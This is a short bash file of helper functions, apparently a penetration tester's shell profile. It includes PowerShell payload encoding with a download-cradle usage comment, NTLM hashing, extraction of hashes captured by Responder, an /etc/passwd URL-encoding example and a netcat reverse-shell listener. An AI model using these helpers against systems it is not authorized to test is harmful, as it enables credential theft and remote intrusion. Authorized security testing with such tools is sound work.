# (b)ase64 (e)code
# usage: be '<string>'
function be() {
	echo -n ${1} | base64 -w0
}

# (b)ase64 (d)ecode
# usage: bd '<string>'
function bd() {
	echo ${1} | base64 -d    
}

# (p)ower(s)hell (e)ncode
# usage pse 'iex(new-object net.webclient).downloadstring...'
function pse() {
	echo -n ${1} | iconv -t utf-16le | base64 -w0
}

# usage tontlm <string>
# NTLM is MD4 hash of UTF-16LE bytes
function tontlm () {
	echo -n ${1} | iconv -t utf-16le | openssl dgst -md4 | awk '{print $NF}'
}

# (g)et (r)esponder (h)ash
# usage grh [user]
# where user matches the first field 
function grh () {
	if [[ $# -eq 1 ]]; then
		SQLITE_USER_FILTER=" where user like \"%${1}%\"" 
	fi
	
	sqlite3 /usr/share/responder/Responder.db "select fullhash from responder${SQLITE_USER_FILTER:-};"
}

# usage: urlencode file:///etc/passwd
# usage: urlencode ftp://user:password@server.local
function urlencode() {
	echo -n $1 | jq -sRr @uri
}

# ICMP visibility - ping pong. get it?
# usage: pong [iface] [filter string]
pong () {
    sudo tcpdump -i ${1:-tun0} -n ${2:-icmp}
}

# basic revshell listener
# TODO: incorporate rlwrap
catch () {
    nc -lvnp ${1:-9001}
}

